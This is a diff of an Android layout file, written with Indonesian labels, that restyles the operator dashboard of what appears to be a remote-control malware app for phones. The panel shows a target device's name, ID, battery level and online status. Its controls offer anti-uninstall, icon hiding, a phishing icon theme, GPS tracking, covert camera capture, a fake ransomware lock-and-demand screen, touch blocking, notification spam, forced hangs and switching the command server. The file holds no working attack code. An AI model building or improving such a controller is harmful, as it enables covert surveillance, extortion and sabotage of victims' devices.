@@ -1,581 +1,338 @@
 <?xml version="1.0" encoding="utf-8"?>
-<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#000000">
+    android:background="#090F1D"
+    android:fillViewport="true">
 
-    <!-- Header: ← 🔒 🔍 🔗 -->
     <LinearLayout
-        android:id="@+id/header"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:orientation="horizontal"
-        android:layout_marginStart="16dp"
-        android:layout_marginTop="16dp">
-
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:text="←"
-            android:textColor="#FFFFFF"
-            android:textSize="28sp"/>
-
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:text=" 🔒 "
-            android:textColor="#FFFFFF"
-            android:textSize="28sp"/>
-
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:text="🔍"
-            android:textColor="#FFFFFF"
-            android:textSize="28sp"/>
-
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:text=" 🔗"
-            android:textColor="#FFFFFF"
-            android:textSize="28sp"/>
-
-    </LinearLayout>
-
-    <!-- Konten Scroll -->
-    <ScrollView
         android:layout_width="match_parent"
-        android:layout_height="match_parent"
-        android:layout_below="@id/header"
-        android:layout_above="@+id/bottomNumber"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
         android:padding="16dp">
 
+        <!-- HERO CARD -->
         <LinearLayout
             android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:orientation="vertical">
+            android:layout_height="240dp"
+            android:background="@drawable/hero_card_bg"
+            android:orientation="vertical"
+            android:padding="20dp"
+            android:layout_marginBottom="16dp">
 
-            <!-- Device Info -->
-            <TextView
-                android:id="@+id/tvDeviceName"
-                android:layout_width="wrap_content"
-                android:layout_height="wrap_content"
-                android:text="2409BRN2CY"
-                android:textColor="#FFFFFF"
-                android:textSize="18sp"
-                android:textStyle="bold"
-                android:layout_marginTop="8dp"/>
-
-            <TextView
-                android:id="@+id/tvStatus"
-                android:layout_width="wrap_content"
-                android:layout_height="wrap_content"
-                android:text="ONLINE"
-                android:textColor="#00FF41"
-                android:textSize="14sp"/>
-
-            <TextView
-                android:id="@+id/tvDeviceId"
-                android:layout_width="wrap_content"
-                android:layout_height="wrap_content"
-                android:text="83c220bfb0ee8435"
-                android:textColor="#888888"
-                android:textSize="12sp"/>
-
-            <!-- Anti Uninstall -->
             <LinearLayout
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginTop="8dp"
-                android:layout_marginBottom="8dp">
+                android:gravity="end">
 
                 <TextView
-                    android:layout_width="0dp"
+                    android:id="@+id/tvDeviceId"
+                    android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Anti Uninstall"
+                    android:text="1e5b8925ea01bef1"
+                    android:textColor="#9CA3AF"
+                    android:textSize="12sp"
+                    android:fontFamily="sans-serif" />
+
+            </LinearLayout>
+
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="0dp"
+                android:layout_weight="1"
+                android:orientation="vertical"
+                android:gravity="center_vertical">
+
+                <TextView
+                    android:id="@+id/tvDeviceName"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="vivo Y20s"
                     android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
+                    android:textSize="22sp"
+                    android:textStyle="bold"
+                    android:fontFamily="sans-serif" />
+
+                <TextView
+                    android:id="@+id/tvStatus"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="ONLINE"
+                    android:textColor="#4ADE80"
+                    android:textSize="13sp"
+                    android:fontFamily="sans-serif"
+                    android:layout_marginTop="4dp" />
+
+            </LinearLayout>
+
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="horizontal"
+                android:gravity="end">
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="Anti Uninstall"
+                    android:textColor="#9CA3AF"
+                    android:textSize="12sp"
+                    android:fontFamily="sans-serif" />
 
                 <TextView
                     android:id="@+id/tvAntiUninstallText"
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
                     android:text="OFF"
-                    android:textColor="#FF1744"
-                    android:textSize="14sp"
-                    android:layout_marginEnd="8dp"/>
+                    android:textColor="#FF5C7C"
+                    android:textSize="12sp"
+                    android:fontFamily="sans-serif"
+                    android:layout_marginStart="8dp" />
 
                 <Switch
                     android:id="@+id/swAntiUninstall"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:thumbTint="#FF1744"
-                    android:trackTint="#333333"/>
+                    android:layout_width="46dp"
+                    android:layout_height="26dp"
+                    android:thumbTint="#FFFFFF"
+                    android:trackTint="#2A3A5C"
+                    android:layout_marginStart="12dp" />
+
             </LinearLayout>
 
-            <!-- GANTI -->
-            <Button
-                android:id="@+id/btnGanti"
-                android:layout_width="match_parent"
+        </LinearLayout>
+
+        <!-- DEVICE SELECTOR -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="90dp"
+            android:background="@drawable/device_card_bg"
+            android:orientation="horizontal"
+            android:padding="16dp"
+            android:gravity="center_vertical"
+            android:layout_marginBottom="16dp">
+
+            <ImageView
+                android:layout_width="48dp"
                 android:layout_height="48dp"
-                android:text="GANTI"
-                android:textColor="#FFFFFF"
-                android:background="#1A1A1A"
-                android:textStyle="bold"
-                android:layout_marginBottom="8dp"/>
+                android:src="@drawable/ic_device"
+                android:background="@drawable/icon_bg"
+                android:padding="12dp" />
 
-            <!-- Device Info 2 -->
-            <TextView
-                android:id="@+id/tvDeviceName2"
-                android:layout_width="wrap_content"
+            <LinearLayout
+                android:layout_width="0dp"
                 android:layout_height="wrap_content"
-                android:text="vivo Y20s"
-                android:textColor="#FFFFFF"
-                android:textSize="14sp"/>
+                android:layout_weight="1"
+                android:orientation="vertical"
+                android:layout_marginStart="16dp">
 
-            <TextView
-                android:id="@+id/tvDeviceId2"
-                android:layout_width="wrap_content"
-                android:layout_height="wrap_content"
-                android:text="1e5b8925ea01bef1"
-                android:textColor="#888888"
-                android:textSize="12sp"/>
+                <TextView
+                    android:id="@+id/tvDeviceName2"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="vivo Y20s"
+                    android:textColor="#FFFFFF"
+                    android:textSize="17sp"
+                    android:textStyle="bold"
+                    android:fontFamily="sans-serif" />
+
+                <TextView
+                    android:id="@+id/tvDeviceId2"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="1e5b8925ea01bef1"
+                    android:textColor="#9CA3AF"
+                    android:textSize="13sp"
+                    android:fontFamily="sans-serif" />
+
+            </LinearLayout>
 
             <TextView
                 android:id="@+id/tvBattery"
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:text="27%"
-                android:textColor="#FFFFFF"
-                android:textSize="14sp"
+                android:text="78%"
+                android:textColor="#4ADE80"
+                android:textSize="17sp"
                 android:textStyle="bold"
-                android:layout_marginBottom="16dp"/>
-
-            <!-- KONTROL DEVICE -->
-            <TextView
-                android:layout_width="wrap_content"
-                android:layout_height="wrap_content"
-                android:text="KONTROL DEVICE"
-                android:textColor="#FFFFFF"
-                android:textSize="18sp"
-                android:textStyle="bold"
-                android:layout_marginBottom="16dp"/>
-
-            <!-- Flashlight -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Flashlight"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <TextView
-                    android:id="@+id/tvFlashlightStatus"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="OFF"
-                    android:textColor="#FF1744"
-                    android:textSize="14sp"
-                    android:layout_marginEnd="8dp"/>
-
-                <Switch
-                    android:id="@+id/swFlashlight"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:thumbTint="#FF1744"
-                    android:trackTint="#333333"/>
-            </LinearLayout>
-
-            <!-- Lock low -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Lock low"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <TextView
-                    android:id="@+id/tvLockLowStatus"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="OFF"
-                    android:textColor="#FF1744"
-                    android:textSize="14sp"
-                    android:layout_marginEnd="8dp"/>
-
-                <Switch
-                    android:id="@+id/swLockLow"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:thumbTint="#FF1744"
-                    android:trackTint="#333333"/>
-            </LinearLayout>
-
-            <!-- Lock Custom V2 -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Lock Custom V2"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <TextView
-                    android:id="@+id/tvLockCustomStatus"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="OFF"
-                    android:textColor="#FF1744"
-                    android:textSize="14sp"
-                    android:layout_marginEnd="8dp"/>
-
-                <Switch
-                    android:id="@+id/swLockCustom"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:thumbTint="#FF1744"
-                    android:trackTint="#333333"/>
-            </LinearLayout>
-
-            <!-- Tema Phising -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Tema Phising"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <Button
-                    android:id="@+id/btnTemaPhising"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="TAP, GANTI ICON"
-                    android:textColor="#FFFFFF"
-                    android:background="@null"
-                    android:textSize="12sp"/>
-            </LinearLayout>
-
-            <!-- Hide Icon -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Hide Icon"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <TextView
-                    android:id="@+id/tvHideIconStatus"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="OFF"
-                    android:textColor="#FF1744"
-                    android:textSize="14sp"
-                    android:layout_marginEnd="8dp"/>
-
-                <Switch
-                    android:id="@+id/swHideIcon"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:thumbTint="#FF1744"
-                    android:trackTint="#333333"/>
-            </LinearLayout>
-
-            <!-- Video Overlay -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Video Overlay"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <Button
-                    android:id="@+id/btnVideoOverlay"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="TAP, PLAY VIDEO"
-                    android:textColor="#FFFFFF"
-                    android:background="@null"
-                    android:textSize="12sp"/>
-            </LinearLayout>
-
-            <!-- Spam Notifikasi -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Spam Notifikasi"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <Button
-                    android:id="@+id/btnSpamNotif"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="TAP, SPAM DIALOG"
-                    android:textColor="#FFFFFF"
-                    android:background="@null"
-                    android:textSize="12sp"/>
-            </LinearLayout>
-
-            <!-- Stuck Layar -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Stuck Layar"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <Button
-                    android:id="@+id/btnStuckLayar"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="TAP, BLOCK TOUCH"
-                    android:textColor="#FFFFFF"
-                    android:background="@null"
-                    android:textSize="12sp"/>
-            </LinearLayout>
-
-            <!-- GPS -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="GPS - Lacak Lokasi"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <Button
-                    android:id="@+id/btnGPS"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="TAP, LACAK"
-                    android:textColor="#FFFFFF"
-                    android:background="@null"
-                    android:textSize="12sp"/>
-            </LinearLayout>
-
-            <!-- Kamera -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Kamera - Ambil Foto"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <Button
-                    android:id="@+id/btnKamera"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="TAP, FOTO"
-                    android:textColor="#FFFFFF"
-                    android:background="@null"
-                    android:textSize="12sp"/>
-            </LinearLayout>
-
-            <!-- Fake Ransomware -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="Fake Ransomware"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <Button
-                    android:id="@+id/btnRansomware"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="TAP, LOCK &amp; MINTA"
-                    android:textColor="#FF1744"
-                    android:background="@null"
-                    android:textSize="12sp"/>
-            </LinearLayout>
-
-            <!-- Ngehang -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center_vertical"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginBottom="4dp">
-
-                <TextView
-                    android:layout_width="0dp"
-                    android:layout_height="wrap_content"
-                    android:layout_weight="1"
-                    android:text="💀 Ngehang"
-                    android:textColor="#FFFFFF"
-                    android:textSize="16sp"/>
-
-                <TextView
-                    android:id="@+id/tvNgehangStatus"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="OFF"
-                    android:textColor="#FF1744"
-                    android:textSize="14sp"
-                    android:layout_marginEnd="8dp"/>
-
-                <Switch
-                    android:id="@+id/swNgehang"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:thumbTint="#FF1744"
-                    android:trackTint="#333333"/>
-            </LinearLayout>
-
-            <!-- Ganti Server -->
-            <EditText
-                android:id="@+id/etServerUrl"
-                android:layout_width="match_parent"
-                android:layout_height="48dp"
-                android:hint="Masukkan URL server baru..."
-                android:textColor="#FFFFFF"
-                android:textColorHint="#666666"
-                android:background="#1A1A1A"
-                android:padding="12dp"
-                android:layout_marginTop="16dp"
-                android:layout_marginBottom="8dp"/>
+                android:fontFamily="sans-serif"
+                android:layout_marginEnd="12dp" />
 
             <Button
-                android:id="@+id/btnSetServer"
-                android:layout_width="match_parent"
-                android:layout_height="48dp"
-                android:text="GANTI SERVER"
-                android:textColor="#000000"
-                android:background="#FFFFFF"
-                android:textStyle="bold"/>
+                android:id="@+id/btnGanti"
+                android:layout_width="36dp"
+                android:layout_height="36dp"
+                android:background="@drawable/dropdown_bg"
+                android:text="⌄"
+                android:textColor="#FFFFFF"
+                android:textSize="18sp" />
 
         </LinearLayout>
 
-    </ScrollView>
+        <!-- JUDUL -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="KONTROL DEVICE"
+            android:textColor="#FFFFFF"
+            android:textSize="22sp"
+            android:textStyle="bold"
+            android:fontFamily="sans-serif"
+            android:layout_marginBottom="16dp" />
 
-    <!-- Angka 88 di pojok kanan bawah -->
-    <TextView
-        android:id="@+id/bottomNumber"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="88"
-        android:textColor="#FFFFFF"
-        android:textSize="48sp"
-        android:textStyle="bold"
-        android:layout_alignParentBottom="true"
-        android:layout_alignParentEnd="true"
-        android:layout_marginEnd="16dp"
-        android:layout_marginBottom="16dp"/>
+        <!-- GRID -->
+        <GridLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:columnCount="2"
+            android:rowCount="6"
+            android:useDefaultMargins="true">
 
-</RelativeLayout>
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardFlashlight"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardLockLow"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardLockCustom"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardTemaPhising"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardHideIcon"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardVideoOverlay"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardSpamNotif"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardStuckLayar"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardGPS"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardKamera"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardRansomware"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+            <include
+                layout="@layout/card_fitur"
+                android:id="@+id/cardNgehang"
+                android:layout_width="0dp"
+                android:layout_height="160dp"
+                android:layout_columnWeight="1"
+                android:layout_margin="6dp" />
+
+        </GridLayout>
+
+        <!-- GANTI SERVER -->
+        <EditText
+            android:id="@+id/etServerUrl"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:hint="Masukkan URL server baru..."
+            android:textColor="#FFFFFF"
+            android:textColorHint="#9CA3AF"
+            android:background="@drawable/input_bg"
+            android:padding="16dp"
+            android:fontFamily="sans-serif"
+            android:textSize="13sp"
+            android:layout_marginTop="16dp"
+            android:layout_marginBottom="12dp" />
+
+        <Button
+            android:id="@+id/btnSetServer"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:text="GANTI SERVER"
+            android:textColor="#FFFFFF"
+            android:background="@drawable/primary_btn_bg"
+            android:textStyle="bold"
+            android:fontFamily="sans-serif"
+            android:textSize="13sp" />
+
+        <!-- FLOATING BUTTON -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="80dp"
+            android:gravity="center|end"
+            android:orientation="horizontal">
+
+            <Button
+                android:layout_width="60dp"
+                android:layout_height="60dp"
+                android:background="@drawable/fab_bg"
+                android:text="+"
+                android:textColor="#FFFFFF"
+                android:textSize="28sp"
+                android:shadowColor="#4D8DFF"
+                android:shadowDx="0"
+                android:shadowDy="0"
+                android:shadowRadius="30" />
+
+        </LinearLayout>
+
+    </LinearLayout>
+
+</ScrollView>
